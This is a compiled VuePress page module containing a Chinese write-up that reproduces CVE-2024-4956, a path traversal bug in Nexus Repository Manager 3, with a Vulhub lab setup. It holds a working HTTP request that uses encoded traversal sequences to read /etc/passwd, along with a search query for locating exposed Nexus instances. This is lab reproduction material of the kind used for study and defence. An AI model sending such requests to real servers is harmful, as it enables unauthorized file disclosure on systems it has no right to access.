import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r,o,c as d,a as e,b as a,d as n,e as t}from"./app-58e4a7d6.js";const l={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u=e("p",null,"Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET 等软件源仓库。",-1),p=e("p",null,"其 3.68.0 及之前版本中，存在一处目录穿越漏洞。攻击者可以利用该漏洞读取服务器上任意文件。",-1),h=e("p",null,"参考链接：",-1),g={href:"https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Sonatype Nexus Repository 3 &lt; 3.68.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Nexus-Repository-Manager&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Nexus Repository Manager version 3.68.0 版本服务器（内存&gt;4G）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8081</code>即可看到 Nexus 的默认页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240527180238662.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,10),_={href:"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf",target:"_blank",rel:"noopener noreferrer"},v=e("code",null,"URIUtil.canonicalPath()",-1),b=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240527155411887.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送如下请求来复现漏洞：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: your-ip:8081
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可见，<code>/etc/passwd</code>已被成功读取。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240527180408453.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function x(f,k){const i=r("ExternalLinkIcon");return o(),d("div",null,[c,u,p,h,e("ul",null,[e("li",null,[e("a",g,[a("https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16"),n(i)])])]),m,e("p",null,[a("与 Orange Tsai 在"),e("a",_,[a("Blackhat US 2018"),n(i)]),a("分享的 SpringMVC CVE-2018-1271 漏洞类似，Jetty 的"),v,a("函数也将空字符串认为是一个合法目录，导致了该漏洞的产生：")]),b])}const F=s(l,[["render",x],["__file","Nexus Repository Manager 3 未授权目录穿越漏洞 CVE-2024-4956.html.vue"]]);export{F as default};
